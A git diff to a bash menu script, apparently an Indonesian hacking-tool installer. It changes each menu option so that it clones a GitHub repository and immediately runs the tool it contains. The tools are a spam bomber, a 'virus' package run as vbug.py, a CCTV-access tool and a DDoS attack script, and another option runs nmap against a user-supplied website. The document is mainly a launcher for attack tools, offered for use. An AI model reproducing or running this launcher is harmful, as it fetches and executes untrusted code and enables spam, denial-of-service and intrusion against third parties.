@@ -73,34 +73,85 @@ echo -e "5.DDOS ATTACKER             " | lolcat
 echo -e "============================" | lolcat
 echo -e "6.EXIT                      " | lolcat
 echo -e "============================" | lolcat
-echo -e "root@./installer:~#" | lolcat 
-read -e fuck case $fuck in
+echo -e "root@./installer:~#" | lolcat read -e fuck 
+case $fuck in
 #SpamBom
-("1")apt-get install git
+("1")
 apt-get install ruby 
+sleep 0.25
+clear
 apt-get install curl
+sleep 0.25
+clear
 gem install lolcat
+sleep 0.25
+clear
 git clone https://github.com/tampansky/SpamBom
-echo -e "instalasi selesai..." | lolcat
-echo -e "Silahkan Cek Repository GUA" | lolcat
+sleep 0.25
+clear
+cd SpamBom
+sleep 0.25
+clear
+chmod +x setup.sh
+sleep 0.25
+clear
+bash setup.sh
+sleep 0.25
+clear
+chmod +x spam.sh
+sleep 0.25
+clear
+bash spam.sh
 ;;
 #nmap
-("2")apt-get install nmap
+("2")
+apt-get install nmap
 echo -e "Masukkan Web"
 read web
 nmap $web
 ;;
-("3")apt-get install python2 python python3
+("3")
+apt-get install python2 python python3
+sleep 0.25
+clear
 git clone https://github.com/tampansky/virus.zip
+sleep 0.25
+clear
+cd virus.zip
+sleep 0.25
+clear
+unzip virus.zip
+sleep 0.25
+clear
+cd vbug
+sleep 0.25
+clear
+python2 vbug.py
 ;;
-("4")apt-get install curl
+("4")
+apt-get install curl
+sleep 0.25
+clear
 git clone https://github.com/zlucifer/all_seeing
-echo -e "cek REPOSITORY GUA NJENK"
+sleep 0.25
+clear
+cd all_seeing
+sleep 0.25
+clear
+bash cctv.sh
 ;;
-("5")apt-get install python python2 python3
+("5")
+apt-get install python python2 python3
+sleep 0.25
+clear
 git clone https://github.com/Ha3MrX/DDos-Attack
+sleep 0.25
+clear
 cd DDos-Attack
+sleep 0.25
+clear
 chmod +x ddos-attack.py
-echo -e "KETIK python ddos-attack.py"
-;;
+sleep 0.25
+clear
+python ddos-attack.py
 esac
